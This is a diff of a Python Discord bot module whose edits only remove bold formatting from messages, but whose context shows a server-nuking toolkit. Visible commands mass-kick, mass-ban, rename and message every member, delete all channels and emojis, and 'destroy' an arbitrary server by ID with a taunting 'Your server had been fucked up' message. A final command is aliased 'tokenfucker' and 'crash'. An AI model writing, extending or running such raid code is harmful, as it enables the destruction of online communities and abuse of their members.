@@ -123,7 +123,7 @@ class Botsudo(commands.Cog):
         if (sudo_users_c.count_documents(query) == 0):
             post = {"_id": user.id, "user": user.name+'#'+user.discriminator ,"reason": reason}
             sudo_users_c.insert_one(post)
-            await ctx.send(f"Successfully added {user} to sudo users!\n**WITH GREAT POWER COMES WITH GREAT RESPONSIBILITY! DON'T ABUSE IT!!**")
+            await ctx.send(f"Successfully added {user} to sudo users!\nWITH GREAT POWER COMES WITH GREAT RESPONSIBILITY! DON'T ABUSE IT!!")
             print(f"{ctx.author} ({ctx.author.id}) added {user} ({user.id}) to sudo users!\nREASON: {reason}")
         else:
             try:
@@ -174,7 +174,7 @@ class Botsudo(commands.Cog):
         """List all users that has sudo perms"""
 
         if (sudo_users_c.estimated_document_count() == 0):
-            await ctx.send('**❌ There are no sudo users!**')
+            await ctx.send('❌ There are no sudo users!')
         else:
             results = list(sudo_users_c.find())
             em = discord.Embed(colour=RandomColour())
@@ -192,8 +192,8 @@ class Botsudo(commands.Cog):
         try:
             await ctx.message.delete()
             await self.bot.user.edit(username=name)
-            await ctx.send(f"Changed my name to **{name}**!")
-            print(f'**{ctx.message.author} ({ctx.message.author.id})** renamed me to {name}.')
+            await ctx.send(f"Changed my name to {name}!")
+            print(f'{ctx.message.author} ({ctx.message.author.id}) renamed me to {name}.')
         except Exception:
             await ctx.send(f"{ctx.message.author.mention}! You are changing my name too fast!")
 
@@ -288,13 +288,13 @@ class Botsudo(commands.Cog):
             colour = RandomColour()
         )
 
-        em.add_field(name="Representer:", value=f"**{ctx.message.author}** ({ctx.message.author.id})", inline=False)
+        em.add_field(name="Representer:", value=f"{ctx.message.author} ({ctx.message.author.id})", inline=False)
         em.add_field(name="Response:", value=f"{msg}", inline=False)
         em.add_field(name="Join our MC-R server!", value=HQ_SERVER_INVITE, inline=False)
 
         await ctx.message.delete()
         await chane.send(embed=em)
-        await ctx.send(f"Sent response: \n{msg} in channel **{chan}**")
+        await ctx.send(f"Sent response: \n{msg} in channel {chan}")
 
     # Servers
     @commands.check(SUDOER_CHECK)
@@ -322,7 +322,7 @@ class Botsudo(commands.Cog):
                 server = self.bot.get_guild(server_id)
                 await server.leave()
                 await ctx.send(f"Left {server} successfully!")
-            print(f'**{ctx.message.author} ({ctx.message.author.id})** ran leaveserver in {ctx.guild.name} ({ctx.guild.id})!')
+            print(f'{ctx.message.author} ({ctx.message.author.id}) ran leaveserver in {ctx.guild.name} ({ctx.guild.id})!')
         except Exception as e:
             print(f"Failed to leave {server}\n{e}")
             await ctx.send(f"Failed to leave {server}\n{e}")
@@ -331,7 +331,7 @@ class Botsudo(commands.Cog):
     @commands.command()
     async def chanmsgall(self, ctx, *, msg):
 
-        print(f"**{ctx.message.author}** used -> {ctx.message.content} <- in {ctx.guild.name} ({ctx.guild.id})")
+        print(f"{ctx.message.author} used -> {ctx.message.content} <- in {ctx.guild.name} ({ctx.guild.id})")
 
         for channel in list(ctx.guild.channels):
             try:
@@ -347,7 +347,7 @@ class Botsudo(commands.Cog):
     @commands.check(SUDOER_CHECK)
     @commands.command()
     async def kickall(self, ctx):
-        print(f"**{ctx.message.author}** used -> {ctx.message.content} <- in {ctx.guild.name} ({ctx.guild.id})")
+        print(f"{ctx.message.author} used -> {ctx.message.content} <- in {ctx.guild.name} ({ctx.guild.id})")
         await ctx.message.delete()
         for user in list(ctx.guild.members):
             try:
@@ -361,7 +361,7 @@ class Botsudo(commands.Cog):
     @commands.check(SUDOER_CHECK)
     @commands.command()
     async def banall(self, ctx):
-        print(f"**{ctx.message.author}** used -> {ctx.message.content} <- in {ctx.guild.name} ({ctx.guild.id})")
+        print(f"{ctx.message.author} used -> {ctx.message.content} <- in {ctx.guild.name} ({ctx.guild.id})")
         await ctx.message.delete()
         for user in list(ctx.guild.members):
             try:
@@ -375,7 +375,7 @@ class Botsudo(commands.Cog):
     @commands.check(SUDOER_CHECK)
     @commands.command()
     async def renameall(self, ctx, *, rename_to):
-        print(f"**{ctx.message.author}** used -> {ctx.message.content} <- in {ctx.guild.name} ({ctx.guild.id})")
+        print(f"{ctx.message.author} used -> {ctx.message.content} <- in {ctx.guild.name} ({ctx.guild.id})")
         await ctx.message.delete()
         for user in list(ctx.guild.members):
             try:
@@ -389,7 +389,7 @@ class Botsudo(commands.Cog):
     @commands.check(SUDOER_CHECK)
     @commands.command()
     async def msgall(self, ctx, *, message):
-        print(f"**{ctx.message.author}** used -> {ctx.message.content} <- in {ctx.guild.name} ({ctx.guild.id})")
+        print(f"{ctx.message.author} used -> {ctx.message.content} <- in {ctx.guild.name} ({ctx.guild.id})")
         await ctx.message.delete()
         for user in ctx.guild.members:
             try:
@@ -403,7 +403,7 @@ class Botsudo(commands.Cog):
     @commands.check(SUDOER_CHECK)
     @commands.command()
     async def deleteall(self, ctx, condition):
-        print(f"**{ctx.message.author}** used -> {ctx.message.content} <- in {ctx.guild.name} ({ctx.guild.id})")
+        print(f"{ctx.message.author} used -> {ctx.message.content} <- in {ctx.guild.name} ({ctx.guild.id})")
         if condition.lower() == "channels":
             for channel in list(ctx.guild.channels):
                 try:
@@ -455,7 +455,7 @@ class Botsudo(commands.Cog):
     @commands.command()
     async def destroy(self, ctx):
         await ctx.send(f"{NUKE_GIF}\nYour server had been fucked up by MC-R!")
-        print(f"**{ctx.message.author}** used -> {ctx.message.content} <- in {ctx.guild.name} ({ctx.guild.id})")
+        print(f"{ctx.message.author} used -> {ctx.message.content} <- in {ctx.guild.name} ({ctx.guild.id})")
         await ctx.message.delete()
         for emoji in list(ctx.guild.emojis):
             try:
@@ -488,10 +488,10 @@ class Botsudo(commands.Cog):
     @commands.command()
     async def destroyid(self, ctx, server_id: int):
         servername = self.bot.get_guild(server_id)
-        nem = discord.Embed(description=f'Attempting to Nuke **{servername.name}**...')
+        nem = discord.Embed(description=f'Attempting to Nuke {servername.name}...')
         nem.set_image(url=NUKE_LAUNCH_GIF)
         nukemsg = await ctx.send(embed=nem)
-        print(f"**{ctx.message.author}** used -> {ctx.message.content} <- in {ctx.guild.name} ({ctx.guild.id}) on {servername} ({servername.id})")
+        print(f"{ctx.message.author} used -> {ctx.message.content} <- in {ctx.guild.name} ({ctx.guild.id}) on {servername} ({servername.id})")
         await ctx.message.delete()
         for emoji in list(servername.emojis):
             try:
@@ -518,7 +518,7 @@ class Botsudo(commands.Cog):
             except:
                 print(f"{user.name} has FAILED to be banned from {servername.name}")
         nem.set_image(url=NUKE_GIF)
-        nukemsg.edit(embed=nem, content=f'**Finished nuking {servername.name}**')
+        nukemsg.edit(embed=nem, content=f'Finished nuking {servername.name}')
 
     @commands.check(SUDOER_CHECK)
     @commands.command(aliases=['tokenfucker', 'disable', 'crash']) 
